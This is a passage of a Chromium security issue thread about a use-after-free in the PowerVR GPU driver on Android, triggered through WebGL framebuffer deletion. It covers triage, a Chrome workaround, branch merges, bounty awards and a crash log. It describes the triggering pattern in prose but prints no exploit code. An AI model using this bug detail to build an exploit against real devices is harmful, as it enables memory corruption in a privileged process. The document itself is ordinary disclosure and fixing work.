Do you mean passthrough mode?It still happens even though I've enabled it.

### pe...@google.com (2026-01-26)

Interesting. The one page that I had a full repro on no longer reproduced when running under angle.
I think if it is true that angle is NOT a fix here it makes it less likely that chrome can trivially provide a fix for validating command decoder.

### ha...@gmail.com (2026-01-26)

Yes, the root cause is the lack of reference counting at the GPU level. This type of problem is not uncommon in GPU modules. These are the ones I have reproduced so far, but there may be more.

### pe...@google.com (2026-01-26)

I see in your code you see variables to null. This is to intentionally trigger a cleanup and therefore a delete/free that will end up as a dangling pointer?

### ha...@gmail.com (2026-01-26)

This is a proof-of-concept (PoC) generated by AI, which can unexpectedly trigger a crash. I think the underlying principle is probably similar.

### mj...@google.com (2026-01-26)

Pixel has investigated and tested internal fixes, vendor has investigated and has an official fix in progress as well. No target date yet.

Is there interest in a workaround in Chrome?

### pe...@google.com (2026-01-26)

There is definitely interest in a Chrome workaround (of course if possible).
From what I can gather it would appear that the solution would be to delay deleting frame buffers or other data.
If from the client side we delay glDelete(...) until we are sure the underlying FBO has no internal references we can avoid the use after free.

### pe...@google.com (2026-01-27)

This could be duplicated into 446253135 but I am leaving it open as this one is assigned to geoff.
These all appear to be related to that single issue of dangling pointers with fbos

### pe...@google.com (2026-01-27)

I tried a repo again with a bit more rigor.
I was able to get a repo for both <https://panic.com/transmit/> and the html file at [comment #11](https://issues.chromium.org/issues/474266014#comment11)

When i enabled 'use-passthrough-command-decoder' I am no longer able to reproduce.
I also tried with the command line --use-cmd-decoder=passthrough and also same result. (ruling out the about flags)
Certainly the issue is still there in the driver but perhaps due to the patterns of Angle(passthrough) the bug doesnt trigger.

Can the original reporter confirm these results.

### pe...@google.com (2026-01-28)

@ha...@gmail.com

Can you check on [comment #28](https://issues.chromium.org/issues/474266014#comment28) It is entirely possible I made a mistake (cmd line args etc) but we are trying to nail down if this does indeed reproduce under passthrough.
This will inform our solutions in chrome.

### ha...@gmail.com (2026-01-29)

I also find it strange that sometimes I can reproduce this vulnerability if I use passthrough decoder (<https://issues.chromium.org/issues/475396626>) and sometimes I can't.

### ha...@gmail.com (2026-01-30)

Do you have a temporary solution?

### pe...@google.com (2026-01-30)

The bug is now with Geoff who is the expert in this area.
I believe he is WIP on a fix but it is probably for him speak to this from here on out.

### ch...@google.com (2026-02-08)

We commit ourselves to a 30 day deadline for fixing for s0 severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

### ge...@google.com (2026-02-10)

I'n testing the Chromium-side workarounds now and proving to myself that we can't hit this case of binding an incomplete framebuffer after the previous framebuffer was deleted.

### ge...@google.com (2026-02-11)

Fixed in <https://chromium-review.googlesource.com/c/chromium/src/+/7533383>

### ch...@google.com (2026-02-12)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M145. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ge...@google.com (2026-02-13)

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)

- <https://chromium-review.googlesource.com/c/chromium/src/+/7533383>

2. Has this fix been verified on Canary to not pose any stability regressions?

- Only 1 canary release so far.

3. Does this fix pose any potential non-verifiable stability risks?

- Not that I am aware of

4. Does this fix pose any known compatibility risks?

- Not that I am aware of

5. Does it require manual verification by the test team? If so, please describe required testing.

- No

### sp...@google.com (2026-02-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $25000.00 for this report.

Rationale for this decision:
Memory corruption in a highly privileged process (e.g. GPU, network processes).


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ha...@gmail.com (2026-02-21)

Hello, is there a mistake with the bounty? The GPU on Android doesn't have a sandbox, right? Please refer to the bounty for this vulnerability: <https://issues.chromium.org/issues/379551588>,

<https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules>

[1] Also includes the GPU process on Android. RCE in the Android GPU process is considered a sandbox escape since the GPU process is not sandboxed on the Android platform

### dr...@chromium.org (2026-02-21)

Sorry for the delay here. No crashes in canary so approving merge to all three milestones.

### dr...@chromium.org (2026-02-21)

Regarding [#comment39](https://issues.chromium.org/issues/474266014#comment39), the comment is wrong but the amount is correct. Our rules give $25,000 for an unsandboxed process, not a highly privileged process.

### ha...@gmail.com (2026-02-21)

Hi,Isn't this a high-quality report?My report is similar to <https://issues.chromium.org/issues/379551588>.

### ch...@google.com (2026-02-24)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-24)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-24)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### go...@google.com (2026-02-24)

Please merge your change to M146 by 11:00 AM PT, Tuesday, Feb 24th so it gets picked up for M146 Early Stable release. Thank you.

### pe...@google.com (2026-02-24)

Geoff is OOO. Started merge to m146 here <https://chromium-review.googlesource.com/c/chromium/src/+/7603193>

### go...@google.com (2026-02-24)

[Bulk Edit]

Please merge your change to M146 by 12:30 PM PT, today, Feb 24th so it gets picked up for M146 Early Stable release tomorrow. Thank you.

### pe...@google.com (2026-02-24)

Yes it is just in the CQ right now.

### dx...@google.com (2026-02-24)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7603193>

[m146] Ensure the previous complete fbo is not deleted on IMG.

---


Expand for full commit details
```
     
    (cherry picked from commit 12f9329852751a2318a6c5b0149268b23004f93e) 
     
    Bug: 474266014 
    Change-Id: I7d84833312749fc58ecb511b276ff6bd783af1ba 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7533383 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583241} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7603193 
    Commit-Queue: Peter McNeeley <petermcneeley@google.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1237} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `gpu/command_buffer/service/context_group.cc`
- M `gpu/command_buffer/service/context_group.h`
- M `gpu/command_buffer/service/decoder_context.h`
- M `gpu/command_buffer/service/feature_info.cc`
- M `gpu/command_buffer/service/feature_info.h`
- M `gpu/command_buffer/service/gles2_cmd_copy_tex_image.cc`
- M `gpu/command_buffer/service/gles2_cmd_copy_texture_chromium.cc`
- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/command_buffer/service/gles2_cmd_decoder_mock.h`
- M `gpu/command_buffer/service/gles2_cmd_decoder_passthrough.cc`
- M `gpu/command_buffer/service/gles2_cmd_decoder_passthrough.h`
- M `gpu/command_buffer/service/raster_decoder.cc`
- M `gpu/command_buffer/service/renderbuffer_manager.cc`
- M `gpu/command_buffer/service/renderbuffer_manager.h`
- M `gpu/command_buffer/service/webgpu_decoder_impl.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

Hash: [dfc3d1833eae3a1bd94a7477d53bbcd782fc6aab](https://chromiumdash.appspot.com/commit/dfc3d1833eae3a1bd94a7477d53bbcd782fc6aab)  

Date: Tue Feb 24 17:01:26 2026


---

### pe...@google.com (2026-02-25)

We need to decide if this needs to go to m145.
m146 will got to stable March 10th so ~2 weeks from now.

### ch...@google.com (2026-02-25)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2026-02-25)

Merge to 145 is in progress <https://chromium-review.git.corp.google.com/c/chromium/src/+/7608619>

### dx...@google.com (2026-02-25)

Project: chromium/src  

Branch:  refs/branch-heads/7632  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7608619>

[m145] Ensure the previous complete fbo is not deleted on IMG.

---


Expand for full commit details
```
     
    (cherry picked from commit 12f9329852751a2318a6c5b0149268b23004f93e) 
     
    Bug: 474266014 
    Change-Id: I7d84833312749fc58ecb511b276ff6bd783af1ba 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7533383 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1583241} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7608619 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org> 
    Commit-Queue: Peter McNeeley <petermcneeley@google.com> 
    Cr-Commit-Position: refs/branch-heads/7632@{#3388} 
    Cr-Branched-From: 0bbdf2913883391365383b0a5dfe7bf9fd1a5213-refs/heads/main@{#1568190}

```

---

Files:

- M `gpu/command_buffer/service/context_group.cc`
- M `gpu/command_buffer/service/context_group.h`
- M `gpu/command_buffer/service/decoder_context.h`
- M `gpu/command_buffer/service/feature_info.cc`
- M `gpu/command_buffer/service/feature_info.h`
- M `gpu/command_buffer/service/gles2_cmd_copy_tex_image.cc`
- M `gpu/command_buffer/service/gles2_cmd_copy_texture_chromium.cc`
- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/command_buffer/service/gles2_cmd_decoder_mock.h`
- M `gpu/command_buffer/service/gles2_cmd_decoder_passthrough.cc`
- M `gpu/command_buffer/service/gles2_cmd_decoder_passthrough.h`
- M `gpu/command_buffer/service/raster_decoder.cc`
- M `gpu/command_buffer/service/renderbuffer_manager.cc`
- M `gpu/command_buffer/service/renderbuffer_manager.h`
- M `gpu/command_buffer/service/webgpu_decoder_impl.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

Hash: [be29697e35d08f973c9ace3de6797a9a9b4a6fae](https://chromiumdash.appspot.com/commit/be29697e35d08f973c9ace3de6797a9a9b4a6fae)  

Date: Wed Feb 25 22:14:55 2026


---

### pe...@google.com (2026-03-01)

Merge into m145 complete.
The only question that remains is if we need to merge into m144.
Given that m145 is already stable for android [1] I dont think this is required.
<https://chromiumdash.appspot.com/schedule>

### dr...@chromium.org (2026-03-02)

Sorry, yes. Given this is Android-only, no value in merging to M144.

### kb...@chromium.org (2026-03-03)

Thank you very much Peter for handling the back-merges!

### ch...@google.com (2026-03-03)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### sp...@google.com (2026-03-03)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
Thank you for raising request for high quality.  While review did not identify this being met we did identify an additional $7000 reward for renderer bonus.  


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### jd...@google.com (2026-03-03)

Updating to include the additional 7000 awarded

### ha...@gmail.com (2026-04-03)

It seems geoff missed triggering other functions, as mentioned in the previous post. Looking at this crash, I can still reproduce it on the latest version.

```
04-03 09:56:29.158  4291  4291 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
04-03 09:56:29.158  4291  4291 F DEBUG   : Build fingerprint: 'google/frankel/frankel:16/CP1A.260305.018/14887507:user/release-keys'
04-03 09:56:29.158  4291  4291 F DEBUG   : Kernel Release: '6.6.102-android15-8-g6eb5b2a8c46b-ab14739656-4k'
04-03 09:56:29.158  4291  4291 F DEBUG   : Revision: 'MP1.0'
04-03 09:56:29.158  4291  4291 F DEBUG   : ABI: 'arm64'
04-03 09:56:29.158  4291  4291 F DEBUG   : Timestamp: 2026-04-03 09:56:29.046253876+0800
04-03 09:56:29.158  4291  4291 F DEBUG   : Process uptime: 20s
04-03 09:56:29.158  4291  4291 F DEBUG   : Executable: /system/bin/app_process64
04-03 09:56:29.158  4291  4291 F DEBUG   : Cmdline: com.android.chrome:privileged_process0
04-03 09:56:29.158  4291  4291 F DEBUG   : pid: 3565, tid: 3632, name: CrGpuMain  >>> com.android.chrome:privileged_process0 <<<
04-03 09:56:29.158  4291  4291 F DEBUG   : uid: 10230
04-03 09:56:29.158  4291  4291 F DEBUG   : tagged_addr_ctrl: 000000000007fff3 (PR_TAGGED_ADDR_ENABLE, PR_MTE_TCF_SYNC, mask 0xfffe)
04-03 09:56:29.158  4291  4291 F DEBUG   : pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
04-03 09:56:29.158  4291  4291 F DEBUG   : esr: 0000000092000011 (Data Abort Exception 0x24)
04-03 09:56:29.158  4291  4291 F DEBUG   : signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x0000007c160f5ba4 (read)
04-03 09:56:29.158  4291  4291 F DEBUG   :     x0  0000000000000000  x1  0800007bd6100c20  x2  0800007bd6100c38  x3  0000000000000000
04-03 09:56:29.158  4291  4291 F DEBUG   :     x4  0000007cd436f944  x5  0000007b960b6ff0  x6  0000000000000001  x7  0000000000000001
04-03 09:56:29.158  4291  4291 F DEBUG   :     x8  0800007bd60fdc7c  x9  0600007c160f5ba0  x10 0800007bd6100c38  x11 0000000000002c1c
04-03 09:56:29.158  4291  4291 F DEBUG   :     x12 0000000000000001  x13 00000000ffffffff  x14 0000000000000000  x15 0000000000000000
04-03 09:56:29.158  4291  4291 F DEBUG   :     x16 00000079f0cf8558  x17 0000007cd42f8560  x18 000000799525c000  x19 0800007bd60fb060
04-03 09:56:29.158  4291  4291 F DEBUG   :     x20 0800007bd6100c38  x21 0800007bd6100c20  x22 0100007c160f92e0  x23 0800007bd6106088
04-03 09:56:29.158  4291  4291 F DEBUG   :     x24 0800007bd6109998  x25 0300007b860c7070  x26 0000000000005bc0  x27 0000000000000004
04-03 09:56:29.158  4291  4291 F DEBUG   :     x28 0000000000005bd8  x29 0000007996850790
04-03 09:56:29.158  4291  4291 F DEBUG   :     lr  0073e179e349e068  sp  0000007996850770  pc  00000079e349e0cc  pst 0000000060001000
04-03 09:56:29.158  4291  4291 F DEBUG   :     esr 0000000092000011  vg  0000000000000002
04-03 09:56:29.158  4291  4291 F DEBUG   : 29 total frames
04-03 09:56:29.158  4291  4291 F DEBUG   : backtrace:
04-03 09:56:29.158  4291  4291 F DEBUG   :       #00 pc 000000000008e0cc  /vendor/lib64/egl/libGLESv2_powervr.so (BindFramebuffer(GLES3Context_TAG*, GLES3FrameBufferRec**, GLES3FrameBufferRec*, bool) (.__uniq.237312041013645830485009770479023593730)+844) (BuildId: cefd59f52838946b0e646aaf2bb04c76)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #01 pc 000000000017ec60  /vendor/lib64/egl/libGLESv2_powervr.so (glDeleteFramebuffers+176) (BuildId: cefd59f52838946b0e646aaf2bb04c76)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #02 pc 0000000008e80a48  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #03 pc 0000000008e84520  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #04 pc 0000000008e804dc  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #05 pc 0000000008eae668  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #06 pc 000000000725113c  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #07 pc 0000000008f2f4bc  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #08 pc 000000000767c2c4  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #09 pc 000000000767bf2c  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #10 pc 000000000776c6ec  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #11 pc 00000000059b5f68  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #12 pc 00000000059777e8  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #13 pc 0000000005977350  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #14 pc 0000000007248c98  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #15 pc 0000000005896268  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #16 pc 00000000059507f8  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #17 pc 000000000595d6c0  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #18 pc 000000000595d42c  /data/app/~~Bsweclw1GhWMoIb1wy1x8Q==/com.google.android.trichromelibrary_768017733-fw80An1Y9WwLFeyZw6LQkw==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: 36894d7d02ba6dd926ce935e4753618f784b9bf4)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #19 pc 0000000000d54ed0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (art_jni_trampoline+112)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #20 pc 00000000006683e8  /apex/com.android.art/lib64/libart.so (nterp_helper+152) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #21 pc 00000000000df14c  /data/app/~~JMcy3Xe-6C-D9JTogvATNA==/com.android.chrome-dJy86UhpK9-Au-v-x4zABA==/base.apk (offset 0x1fc000) (no3.run+564)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #22 pc 00000000003215f0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (java.lang.Thread.run+64)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #23 pc 00000000002aaf94  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #24 pc 00000000002709b0  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+220) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #25 pc 00000000004bdfc8  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1184) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #26 pc 00000000004bdb18  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: 61c7a211c01ef3c0068b4fbe31051050)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #27 pc 000000000008a914  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: 8d65ea529c21c79c019713e50adb6675)
04-03 09:56:29.158  4291  4291 F DEBUG   :       #28 pc 000000000007b5a4  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: 8d65ea529c21c79c019713e50adb6675)
04-03 09:56:29.158  4291  4291 F DEBUG   : Learn more about MTE reports: https://source.android.com/docs/security/test/memory-safety/mte-reports


```

### kb...@chromium.org (2026-04-03)

Submitter: what are the reproduction steps for the continued crash?

The bug that was fixed in Imagination's driver was related to framebuffer objects, and Geoff's workaround should have been robust in this scenario. But if there are other OpenGL objects that are improperly reference counted in the graphics driver, more driver-level fixes are needed, and investigation is needed to know whether a workaround is possible. (In the case of the framebuffer object bug it was, because a valid FBO could be bound in the place of an incomplete one coming from the user.)

### ha...@gmail.com (2026-04-04)

deleted

### ha...@gmail.com (2026-04-05)

I created an new issue <https://issues.chromium.org/issues/499467136>

### ch...@google.com (2026-05-21)

